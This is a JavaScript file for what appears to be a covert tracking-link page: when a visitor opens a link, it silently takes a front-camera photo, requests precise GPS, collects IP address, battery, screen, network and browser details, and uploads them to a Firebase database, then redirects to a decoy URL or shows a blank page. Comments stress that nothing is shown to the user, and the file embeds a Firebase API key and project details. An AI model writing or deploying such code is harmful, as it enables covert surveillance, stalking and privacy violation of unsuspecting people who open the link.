// ── IMPORTS ───────────────────────────────────────────────────────────────
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, set, get, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

// ── FIREBASE CONFIG ───────────────────────────────────────────────────────
const firebaseConfig = {
    apiKey:            "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
    authDomain:        "camera-c436d.firebaseapp.com",
    databaseURL:       "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId:         "camera-c436d",
    storageBucket:     "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId:             "1:1024848910212:web:80a95f41281d1a920eafd1"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

// ── COLLECT DEVICE INFO ───────────────────────────────────────────────────
async function collectDeviceInfo() {
    const ua = navigator.userAgent;
    const info = {
        userAgent:      ua,
        platform:       navigator.platform || 'Unknown',
        language:       navigator.language || 'Unknown',
        screenWidth:    screen.width,
        screenHeight:   screen.height,
        colorDepth:     screen.colorDepth,
        timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus:   navigator.onLine,
        referrer:       document.referrer || 'Direct',
        pageUrl:        window.location.href,
    };

    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        info.networkType = conn.effectiveType || 'Unknown';
        info.downlink    = conn.downlink != null ? conn.downlink + ' Mbps' : 'Unknown';
    } else {
        info.networkType = 'Unknown';
        info.downlink    = 'Unknown';
    }

    try {
        const bat = await Promise.race([
            navigator.getBattery(),
            new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 2000))
        ]);
        info.battery  = Math.round(bat.level * 100) + '%';
        info.charging = bat.charging ? 'Yes' : 'No';
    } catch (_) {
        info.battery  = 'Unavailable';
        info.charging = 'Unavailable';
    }

    if      (/android/i.test(ua))           info.os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua))  info.os = 'iOS';
    else if (/windows phone/i.test(ua))     info.os = 'Windows Phone';
    else if (/windows/i.test(ua))           info.os = 'Windows';
    else if (/mac/i.test(ua))               info.os = 'macOS';
    else if (/linux/i.test(ua))             info.os = 'Linux';
    else                                    info.os = 'Unknown';

    if      (/edg\//i.test(ua))                               info.browser = 'Edge';
    else if (/opr\/|opera/i.test(ua))                         info.browser = 'Opera';
    else if (/chrome\/\d/i.test(ua))                          info.browser = 'Chrome';
    else if (/firefox\/\d/i.test(ua))                         info.browser = 'Firefox';
    else if (/safari\/\d/i.test(ua) && !/chrome/i.test(ua))  info.browser = 'Safari';
    else                                                       info.browser = 'Unknown';

    return info;
}

// ── GET PUBLIC IP ─────────────────────────────────────────────────────────
async function getIPAddress() {
    const apis = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/json/'
    ];
    for (const url of apis) {
        try {
            const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
            const d = await r.json();
            const ip = d.ip || d.IPv4 || null;
            if (ip) return ip;
        } catch (_) { /* try next */ }
    }
    return 'Unavailable';
}

// ── CAPTURE PHOTO (silent) ────────────────────────────────────────────────
async function capturePhoto() {
    const video  = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
    } catch (e) {
        console.warn('Camera denied:', e.message);
        return null;
    }

    const readyPromise = new Promise(resolve => {
        video.onloadedmetadata = () => {
            video.play().catch(() => {}).finally(resolve);
        };
        setTimeout(resolve, 6000);
    });

    video.srcObject = stream;
    await readyPromise;
    await new Promise(r => setTimeout(r, 1200));

    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoData = canvas.toDataURL('image/jpeg', 0.80);

    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    return photoData;
}

// ── GET GPS LOCATION (silent) ─────────────────────────────────────────────
async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            resolve({ lat: 'Unavailable', lon: 'Unavailable' });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            pos  => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            err  => { console.warn('GPS denied:', err.message); resolve({ lat: 'Denied', lon: 'Denied' }); },
            { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
        );
    });
}

// ── VALIDATE URL ──────────────────────────────────────────────────────────
function isValidUrl(url) {
    if (!url || typeof url !== 'string') return false;
    const s = url.trim();
    if (!s) return false;
    try {
        const u = new URL(s);
        return u.protocol === 'http:' || u.protocol === 'https:';
    } catch (_) {
        return false;
    }
}

// ── SAVE CAPTURE TO FIREBASE ──────────────────────────────────────────────
async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo }) {
    const now = Date.now();
    try {
        const newRef = push(ref(db, 'photo_history'));
        await set(newRef, {
            id:         now,
            image:      photoData || null,
            latitude:   lat,
            longitude:  lon,
            linkName:   settings.name  || 'Unknown',
            linkId:     linkId,
            date:       new Date(now).toLocaleDateString(),
            time:       new Date(now).toLocaleTimeString(),
            timestamp:  now,
            ipAddress:  ipAddress,
            device:     deviceInfo,
            _ownerType: settings._ownerType || 'admin',
            _ownerId:   settings._ownerId   || 'admin'
        });
    } catch (e) {
        console.error('Firebase save error:', e);
    }
}

// ── MAIN FLOW ─────────────────────────────────────────────────────────────
async function initVerification() {
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('linkId');

    // No linkId — silently stop.
    if (!linkId) return;

    // Fetch link settings.
    let settings;
    try {
        const snap = await get(ref(db, 'managed_links/' + linkId));
        settings   = snap.val();
    } catch (e) {
        console.error('Firebase fetch error:', e);
        return;
    }

    // Invalid or disabled link — silently stop.
    if (!settings || !settings.active) return;

    // Increment visit count (fire-and-forget).
    update(ref(db, 'managed_links/' + linkId), { visits: (settings.visits || 0) + 1 }).catch(() => {});

    const needsCam    = !!settings.cam;
    const needsGPS    = !!settings.gps;
    const hasRedirect = isValidUrl(settings.redirectUrl);

    // ── Kick off background tasks immediately ────────────────────────────
    const infoPromise = collectDeviceInfo();
    const ipPromise   = getIPAddress();

    // ── Request required permissions immediately (no UI, no delay) ───────
    const camPromise = needsCam ? capturePhoto() : Promise.resolve(null);
    const gpsPromise = needsGPS ? getLocation()  : Promise.resolve({ lat: 'Denied', lon: 'Denied' });

    const [photoData, gpsResult] = await Promise.all([camPromise, gpsPromise]);

    const lat = gpsResult?.lat ?? 'Denied';
    const lon = gpsResult?.lon ?? 'Denied';

    // ── Determine if all required permissions were granted ────────────────
    const camGranted = !needsCam || (photoData !== null);
    const gpsGranted = !needsGPS || (typeof lat === 'number');
    const allGranted = camGranted && gpsGranted;

    // ── REDIRECT PATH ────────────────────────────────────────────────────
    if (hasRedirect && allGranted) {
        // Save capture without blocking the redirect.
        Promise.all([infoPromise, ipPromise])
            .then(([deviceInfo, ipAddress]) =>
                saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo })
            )
            .catch(e => console.error('Async capture save failed:', e));

        window.location.replace(settings.redirectUrl.trim());
        return;
    }

    // ── NO-REDIRECT PATH ─────────────────────────────────────────────────
    // Save capture, then stay completely silent — no messages, no UI changes.
    const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
    await saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo });
    // Page remains blank. Nothing shown to the user.
}

// ── BOOT ─────────────────────────────────────────────────────────────────
window.addEventListener('load', initVerification);
